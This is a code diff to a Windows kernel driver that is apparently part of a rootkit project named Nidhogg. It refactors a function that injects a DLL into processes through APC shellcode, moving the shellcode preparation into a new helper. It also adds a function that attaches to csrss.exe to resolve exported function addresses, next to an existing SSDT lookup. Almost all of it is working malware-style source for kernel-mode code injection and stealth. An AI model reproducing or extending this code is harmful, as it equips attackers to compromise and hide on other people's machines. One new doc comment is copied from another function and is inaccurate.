@@ -4,6 +4,7 @@
 #include "ProcessUtils.hpp"
 #include "MemoryAllocator.hpp"
 #include "MemoryHelper.hpp"
+#include "InjectionShellcode.hpp"
 
 MemoryUtils::MemoryUtils() {
 	this->hiddenDrivers.Count = 0;
@@ -68,29 +69,11 @@ MemoryUtils::~MemoryUtils() {
 NTSTATUS MemoryUtils::InjectDllAPC(DllInformation* DllInfo) {
 	ShellcodeInformation ShellcodeInfo{};
 	PVOID shellcode = NULL;
-	SIZE_T shellcodeSize = DLL_INJ_SHELLCODE_SIZE;
 
-	NTSTATUS status = ZwAllocateVirtualMemory(ZwCurrentProcess(), &shellcode, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
+	NTSTATUS status = PrepareShellcode(ZwCurrentProcess(), PsGetCurrentProcess(), DllInfo->DllPath, &shellcode);
 
 	if (!NT_SUCCESS(status))
 		return status;
-
-	shellcodeSize = DLL_INJ_SHELLCODE_SIZE;
-
-	// Filling the shellcode from the template.
-	status = KeWriteProcessMemory(&shellcodeTemplate, PsGetCurrentProcess(), shellcode, shellcodeSize, KernelMode);
-
-	if (!NT_SUCCESS(status)) {
-		ZwFreeVirtualMemory(ZwCurrentProcess(), &shellcode, &shellcodeSize, MEM_DECOMMIT);
-		return status;
-	}
-
-	status = KeWriteProcessMemory(&(DllInfo->DllPath), PsGetCurrentProcess(), (PUCHAR)shellcode + PATH_OFFSET, sizeof(DllInfo->DllPath), KernelMode);
-
-	if (!NT_SUCCESS(status)) {
-		ZwFreeVirtualMemory(ZwCurrentProcess(), &shellcode, &shellcodeSize, MEM_DECOMMIT);
-		return status;
-	}
 
 	// Creating the shellcode information for APC injection.
 	ShellcodeInfo.Parameter1 = NULL;
@@ -101,7 +84,6 @@ NTSTATUS MemoryUtils::InjectDllAPC(DllInformation* DllInfo) {
 	ShellcodeInfo.ShellcodeSize = DLL_INJ_SHELLCODE_SIZE;
 
 	status = InjectShellcodeAPC(&ShellcodeInfo);
-
 	return status;
 }
 
@@ -1261,10 +1243,10 @@ PVOID MemoryUtils::GetFunctionAddress(PVOID moduleBase, CHAR* functionName) {
 * GetSSDTFunctionAddress is responsible for getting the SSDT's location.
 *
 * Parameters:
-* There are no parameters.
+* @functionName [CHAR*]	   -- Function name to search.
 *
 * Returns:
-* @status [NTSTATUS] -- STATUS_SUCCESS if found, else error.
+* @status		[NTSTATUS] -- STATUS_SUCCESS if found, else error.
 */
 PVOID MemoryUtils::GetSSDTFunctionAddress(CHAR* functionName) {
 	KAPC_STATE state;
@@ -1312,6 +1294,48 @@ PVOID MemoryUtils::GetSSDTFunctionAddress(CHAR* functionName) {
 	if (syscall != 0)
 		functionAddress = (PUCHAR)this->ssdt->ServiceTableBase + (((PLONG)this->ssdt->ServiceTableBase)[syscall] >> 4);
 
+	ObDereferenceObject(CsrssProcess);
+	return functionAddress;
+}
+
+/*
+* Description:
+* GetSSDTFunctionAddress is responsible for getting the SSDT's location.
+*
+* Parameters:
+* @functionName [CHAR*]	   -- Function name to search.
+* @moduleName   [WCHAR*]   -- Module's name to search.
+*
+* Returns:
+* @status		[NTSTATUS] -- STATUS_SUCCESS if found, else error.
+*/
+PVOID MemoryUtils::GetFuncAddress(CHAR* functionName, WCHAR* moduleName) {
+	KAPC_STATE state;
+	PEPROCESS CsrssProcess = NULL;
+	PVOID functionAddress = NULL;
+	ULONG csrssPid = 0;
+	NTSTATUS status = NidhoggProccessUtils->FindPidByName(L"csrss.exe", &csrssPid);
+
+	if (!NT_SUCCESS(status))
+		return functionAddress;
+
+	status = PsLookupProcessByProcessId(ULongToHandle(csrssPid), &CsrssProcess);
+
+	if (!NT_SUCCESS(status))
+		return functionAddress;
+
+	// Attaching to the process's stack to be able to walk the PEB.
+	KeStackAttachProcess(CsrssProcess, &state);
+	PVOID moduleBase = GetModuleBase(CsrssProcess, moduleName);
+
+	if (!moduleBase) {
+		KeUnstackDetachProcess(&state);
+		ObDereferenceObject(CsrssProcess);
+		return functionAddress;
+	}
+	functionAddress = GetFunctionAddress(moduleBase, functionName);
+
+	KeUnstackDetachProcess(&state);
 	ObDereferenceObject(CsrssProcess);
 	return functionAddress;
 }
